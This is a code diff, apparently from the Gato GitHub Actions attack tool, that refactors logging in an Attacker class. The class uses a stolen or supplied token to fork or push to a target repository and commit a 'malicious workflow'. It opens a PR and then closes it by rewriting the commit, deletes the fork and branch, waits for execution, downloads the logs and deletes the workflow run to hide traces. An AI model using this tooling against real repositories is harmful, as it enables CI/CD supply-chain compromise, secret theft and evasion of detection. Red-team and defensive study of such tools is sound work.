@@ -6,7 +6,7 @@ import string
 from gato.github import Api
 from gato.git import Git
 from gato.attack import CICDAttack
-from gato.cli import bright
+from gato.cli import Output
 
 logger = logging.getLogger(__name__)
 logging.root.setLevel(logging.DEBUG)
@@ -19,7 +19,6 @@ class Attacker:
 
     def __init__(
         self,
-        output,
         pat: str,
         socks_proxy: str = None,
         http_proxy: str = None,
@@ -29,7 +28,6 @@ class Attacker:
     ):
 
         self.api = Api(
-            output,
             pat,
             socks_proxy=socks_proxy,
             http_proxy=http_proxy,
@@ -41,7 +39,6 @@ class Attacker:
         self.author_email = author_email
         self.author_name = author_name
         self.timeout = timeout
-        self.output = output
 
     def __setup_user_info(self):
         if not self.user_perms:
@@ -57,13 +54,13 @@ class Attacker:
             if self.author_name is None:
                 self.author_name = self.user_perms['name']
 
-            self.output.info(
+            Output.info(
                 "The authenticated user is: "
-                f"{bright(self.user_perms['user'])}"
+                f"{Output.bright(self.user_perms['user'])}"
             )
-            self.output.info(
+            Output.info(
                 "The GitHub Classic PAT has the following scopes: "
-                f'{", ".join(self.user_perms["scopes"])}'
+                f'{Output.yellow(", ".join(self.user_perms["scopes"]))}'
             )
 
         return True
@@ -103,35 +100,35 @@ class Attacker:
         if 'repo' in self.user_perms['scopes'] and \
            'workflow' in self.user_perms['scopes']:
 
-            self.output.info(
-                f"Conducting an attack against {bright(target_repo)} as the "
-                f"user: {bright(self.user_perms['user'])}!"
+            Output.info(
+                f"Conducting an attack against {Output.bright(target_repo)} as the "
+                f"user: {Output.bright(self.user_perms['user'])}!"
             )
 
             res = self.api.get_repo_branch(target_repo, target_branch)
             if res == 0:
-                self.output.error(f"Target branch, {target_branch}, does not exist!")
+                Output.error(f"Target branch, {target_branch}, does not exist!")
                 return False
             elif res == -1:
-                self.output.error("Failed to check for target branch!")
+                Output.error("Failed to check for target branch!")
                 return False
 
             repo_name = self.api.fork_repository(target_repo)
             if not repo_name:
-                self.output.error("Error while forking repository!")
+                Output.error("Error while forking repository!")
                 return False
 
             for i in range(self.timeout):
                 status = self.api.get_repository(repo_name)
                 if status:
-                    self.output.result(f"Successfully created fork: {repo_name}!")
+                    Output.result(f"Successfully created fork: {repo_name}!")
                     time.sleep(5)
                     break
                 else:
                     time.sleep(1)
 
             if not status:
-                self.output.error(
+                Output.error(
                     f"Forked repository not found after {self.timeout} seconds!"
                 )
                 return False
@@ -152,7 +149,7 @@ class Attacker:
                     time.sleep(1)
 
             if not status:
-                self.output.error("Error cloning forked repository!")
+                Output.error("Error cloning forked repository!")
                 return False
 
             if custom_workflow:
@@ -169,12 +166,12 @@ class Attacker:
                 message=commit_message
             )
             if not status:
-                self.output.error("Failed to commit the malicious workflow locally!")
+                Output.error("Failed to commit the malicious workflow locally!")
                 return False
 
             status = cloned_repo.push_repository(source_branch)
             if not status:
-                self.output.error("Unable push change!")
+                Output.error("Unable push change!")
 
             if target_branch is None:
                 target_branch = 'main'
@@ -188,15 +185,15 @@ class Attacker:
             )
 
             if pr_url:
-                self.output.result(
+                Output.result(
                     "Successfully created a PR! It can be viewed at: "
-                    f"{bright(pr_url)}"
+                    f"{Output.bright(pr_url)}"
                 )
 
                 rebase_status = cloned_repo.rewrite_commit()
 
                 if rebase_status:
-                    self.output.result("Successfully rebased commit")
+                    Output.result("Successfully rebased commit")
 
                     push_status = cloned_repo.push_repository(
                         source_branch,
@@ -204,18 +201,18 @@ class Attacker:
                     )
 
                     if push_status:
-                        self.output.result("Pushed commit to close PR!")
+                        Output.result("Pushed commit to close PR!")
 
             else:
-                self.output.error("Failed to create a PR for the fork!")
+                Output.error("Failed to create a PR for the fork!")
 
             success = self.api.delete_repository(repo_name)
             if success:
-                self.output.result("Successfully deleted the fork!")
+                Output.result("Successfully deleted the fork!")
             else:
-                self.output.error("Failed to delete the fork!")
+                Output.error("Failed to delete the fork!")
         else:
-            self.output.error(
+            Output.error(
                 "The user does not have the necessary scopes to conduct this "
                 "attack!"
             )
@@ -237,9 +234,9 @@ class Attacker:
         if 'repo' in self.user_perms['scopes'] and \
            'workflow' in self.user_perms['scopes']:
 
-            self.output.info(
-                    f"Will be conducting an attack against {bright(target_repo)} as"
-                    f" the user: {bright(self.user_perms['user'])}!"
+            Output.info(
+                    f"Will be conducting an attack against {Output.bright(target_repo)} as"
+                    f" the user: {Output.bright(self.user_perms['user'])}!"
             )
 
             cloned_repo = Git(
@@ -261,10 +258,10 @@ class Attacker:
 
             res = self.api.get_repo_branch(target_repo, branch)
             if res == -1:
-                self.output.error("Failed to check for remote branch!")
+                Output.error("Failed to check for remote branch!")
                 return
             elif res == 1:
-                self.output.error(f"Remote branch, {branch}, already exists!")
+                Output.error(f"Remote branch, {branch}, already exists!")
                 return
 
             if custom_workflow:
@@ -282,67 +279,67 @@ class Attacker:
             )
 
             if rev_hash is None:
-                self.output.error("Failed to commit the malicious workflow locally!")
+                Output.error("Failed to commit the malicious workflow locally!")
                 return
 
             status = cloned_repo.push_repository(branch)
 
             if not status:
-                self.output.error("Failed to push the malicious workflow!")
+                Output.error("Failed to push the malicious workflow!")
                 return
 
-            self.output.result("Succesfully pushed the malicious workflow!")
+            Output.result("Succesfully pushed the malicious workflow!")
 
             ret = cloned_repo.delete_branch(branch)
 
             if ret:
-                self.output.result("Malicious branch deleted.")
+                Output.result("Malicious branch deleted.")
             else:
-                self.output.error(f"Failed to delete the branch: {branch}.")
+                Output.error(f"Failed to delete the branch: {branch}.")
 
-            self.output.tabbed("Waiting for the workflow to queue...")
+            Output.tabbed("Waiting for the workflow to queue...")
 
             for i in range(self.timeout):
                 workflow_id = self.api.get_recent_workflow(target_repo, rev_hash)
                 if workflow_id == -1:
-                    self.output.error("Failed to find the created workflow!")
+                    Output.error("Failed to find the created workflow!")
                     return
                 elif workflow_id > 0:
                     break
                 else:
                     time.sleep(1)
             else:
-                self.output.error("Failed to find the created workflow!")
+                Output.error("Failed to find the created workflow!")
                 return
 
-            self.output.tabbed("Waiting for the workflow to execute...")
+            Output.tabbed("Waiting for the workflow to execute...")
 
             for i in range(self.timeout):
                 status = self.api.get_workflow_status(target_repo, workflow_id)
                 if status == -1:
-                    self.output.error("The workflow failed!")
+                    Output.error("The workflow failed!")
                     break
                 elif status == 1:
-                    self.output.result("The malicious workflow executed succesfully!")
+                    Output.result("The malicious workflow executed succesfully!")
                     break
                 else:
                     time.sleep(1)
             else:
-                self.output.error("The workflow is incomplete but hit the timeout!")
+                Output.error("The workflow is incomplete but hit the timeout!")
 
             res = self.api.download_workflow_logs(target_repo, workflow_id)
             if not res:
-                self.output.error("Failed to download logs!")
+                Output.error("Failed to download logs!")
             else:
-                self.output.result(f"Workflow logs downloaded to {workflow_id}.zip!")
+                Output.result(f"Workflow logs downloaded to {workflow_id}.zip!")
 
             if delete_action:
                 res = self.api.delete_workflow_run(target_repo, workflow_id)
                 if not res:
-                    self.output.error("Failed to delete workflow!")
+                    Output.error("Failed to delete workflow!")
                 else:
-                    self.output.result("Workflow deleted sucesfully!")
+                    Output.result("Workflow deleted sucesfully!")
         else:
-            self.output.error(
+            Output.error(
                 "The user does not have the necessary scopes to conduct this "
                 "attack!")
